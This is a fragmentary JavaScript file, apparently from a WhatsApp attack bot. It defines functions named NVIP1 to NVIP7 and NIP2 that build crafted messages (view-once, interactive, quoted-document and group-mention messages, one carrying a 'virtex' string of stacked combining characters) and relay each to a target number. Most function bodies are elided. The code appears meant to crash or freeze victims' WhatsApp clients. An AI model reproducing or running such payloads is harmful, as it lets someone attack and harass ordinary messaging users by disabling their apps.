...
async function NIP2(target) {
    try {
        ...
        await ctx.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
...
async function NVIP1(target) {
    let message = {
      viewOnceMessage: {
        message: {
          ...
          interactiveMessage: {
              contextInfo: {
              stanzaId: ctx.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
    ...
    await ctx.relayMessage(target, message, {
      participant: { jid: target },
    });
  }
...
async function NVIP3(target) {
  ...
  await ctx.relayMessage(target, messagePayload, {
    participant: { jid: target},
  });
}
...
async function NVIP4(nomor) {
     ...
     let msg = await generateWAMessageFromContent(target, {
            ...
            await ctx.relayMessage(target, msg.message, {
...
async function NVIP6(target) {
    ...
    ctx.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}

async function NVIP7(target) {
 let virtex = "🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒ 𐎟";
   ctx.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
